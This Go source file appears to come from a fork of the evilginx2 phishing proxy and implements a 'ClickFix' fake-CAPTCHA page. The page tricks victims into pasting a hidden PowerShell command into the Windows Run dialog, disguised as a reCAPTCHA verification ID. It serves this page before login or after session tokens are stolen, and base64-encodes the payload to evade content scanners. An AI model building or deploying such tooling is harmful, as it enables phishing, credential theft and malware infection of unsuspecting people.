// evilginx2-extended (fork): clickfix — fake-captcha gate serving.
//
// Loads self-contained HTML templates from clickfix/templates/<name>.html
// (gitignored — campaign-specific, deployed alongside phishlets), substitutes
// the {command} payload (base64-encoded to keep it out of the static source)
// and the {redirect_url}, then serves them at two hook points:
//
//   position=before → at the lure redirector position (pre-login gate)
//   position=after  → replacing the post-completion JS redirect
//
// Detection hardening (matching the phishing pages' CSD doctrine):
//   - the command payload is base64-encoded in the page source, decoded at
//     runtime — no cleartext payload for content scanners to signature
//   - templates use {command_b64} (encoded) instead of {command} (cleartext)
//   - both {redirect_url} and {lure_url_js} are substituted in every serve
//     path — no placeholder tokens leak into the served HTML
//   - responses carry no-cache headers
//   - Verification ID is generated server-side (Go) and substituted into
//     BOTH the command and the page display — guaranteed to match
package core

import (
	"encoding/base64"
	"fmt"
	"math/rand"
	"net/http"
	"os"
	"path/filepath"
	"strings"

	"github.com/elazarl/goproxy"
	"github.com/kgretzky/evilginx2/log"
)

// clickFixTemplateDir returns the directory containing clickfix templates,
// resolved as a sibling of the redirectors directory.
func (p *HttpProxy) clickFixTemplateDir() string {
	return filepath.Join(filepath.Dir(p.cfg.GetRedirectorsDir()), "clickfix", "templates")
}

// loadClickFixTemplate reads and returns the raw template HTML.
func (p *HttpProxy) loadClickFixTemplate(name string) (string, error) {
	if name == "" {
		return "", fmt.Errorf("clickfix: no template name")
	}
	dir := p.clickFixTemplateDir()
	path := filepath.Join(dir, name+".html")
	abs, err := filepath.Abs(path)
	if err != nil || !strings.HasPrefix(abs, dir) {
		return "", fmt.Errorf("clickfix: invalid template name")
	}
	data, err := os.ReadFile(path)
	if err != nil {
		return "", fmt.Errorf("clickfix: template %q not found (deploy to %s): %v",
			name, dir, err)
	}
	return string(data), nil
}

// wrapClickFixPayload embeds the operator's payload inside a realistic-looking
// Windows command. The {VID} placeholder is replaced server-side with the
// same random ID displayed on the page.
func wrapClickFixPayload(command, vid string) string {
	command = strings.TrimSpace(command)
	if command == "" {
		return command
	}
	lower := strings.ToLower(command)
	if strings.HasPrefix(lower, "cmd /c") || strings.HasPrefix(lower, "powershell") ||
		strings.HasPrefix(lower, "cmd.exe") || strings.HasPrefix(lower, "mshta") ||
		strings.HasPrefix(lower, "rundll32") || strings.HasPrefix(lower, "certutil") ||
		strings.HasPrefix(lower, "bitsadmin") || strings.HasPrefix(lower, "curl ") ||
		strings.HasPrefix(lower, "wget ") || strings.HasPrefix(lower, "start ") {
		return strings.ReplaceAll(command, "{VID}", vid)
	}
	// Unified tail for every template (matches the real-world ClickFix
	// campaigns): the visible end of the pasted Run-dialog string reads
	// "I am not a robot - reCAPTCHA Verification ID: XXXX" while the payload
	// itself scrolls out of view. No apostrophe — safe inside PS single quotes.
	return `powershell -w hidden -ep bypass -c "` + command + `;$id='I am not a robot - reCAPTCHA Verification ID: ` + vid + `'"`
}

// renderClickFix substitutes all placeholders:
//   {command_b64}  → base64(wrapped command with VID already substituted)
//   {command}      → the raw wrapped command
//   {redirect_url} → the post-verify redirect target
//   {subdomain}    → display domain override
//   {VID}          → the verification ID (for the page display element)
func renderClickFix(tmpl, command, redirectUrl, subdomain, vid string) string {
	wrapped := wrapClickFixPayload(command, vid)
	out := strings.ReplaceAll(tmpl, "{command_b64}", base64.StdEncoding.EncodeToString([]byte(wrapped)))
	out = strings.ReplaceAll(out, "{command}", wrapped)
	out = strings.ReplaceAll(out, "{redirect_url}", redirectUrl)
	out = strings.ReplaceAll(out, "{subdomain}", subdomain)
	out = strings.ReplaceAll(out, "{VID}", vid)
	return out
}

// genVID generates a random 4-digit verification ID (real-campaign format).
func genVID() string {
	return fmt.Sprintf("%04d", rand.Intn(10000))
}

// serveClickFixBefore serves the clickfix gate at the lure path (pre-login).
func (p *HttpProxy) serveClickFixBefore(req *http.Request, cf *ClickFix, lure_url string, params *map[string]string) (*http.Request, *http.Response) {
	tmpl, err := p.loadClickFixTemplate(cf.Template)
	if err != nil {
		log.Warning("%v — falling back to normal redirect", err)
		return req, nil
	}
	vid := genVID()
	sub := cf.Subdomain
	if sub == "" {
		sub = req.Host
	}
	redirect := lure_url
	if cf.Only {
		redirect = lure_url
	}
	body := renderClickFix(tmpl, cf.Command, redirect, sub, vid)
	body = p.replaceHtmlParams(body, lure_url, params)
	log.Info("clickfix: pre-auth gate (%s) vid=%s [%s]", cf.Template, vid, req.RemoteAddr)
	resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
	if resp != nil {
		resp.Header.Set("Cache-Control", "no-cache, no-store")
	}
	return req, resp
}

// serveClickFixAfter serves the clickfix gate after all auth tokens are captured.
func (p *HttpProxy) serveClickFixAfter(req *http.Request, cf *ClickFix, redirectUrl string) (*http.Request, *http.Response) {
	tmpl, err := p.loadClickFixTemplate(cf.Template)
	if err != nil {
		log.Warning("%v — falling back to normal redirect", err)
		return p.javascriptRedirect(req, redirectUrl)
	}
	vid := genVID()
	body := renderClickFix(tmpl, cf.Command, redirectUrl, cf.Subdomain, vid)
	log.Info("clickfix: post-auth gate (%s) vid=%s [%s]", cf.Template, vid, req.RemoteAddr)
	resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
	if resp != nil {
		resp.Header.Set("Cache-Control", "no-cache, no-store")
	}
	return req, resp
}
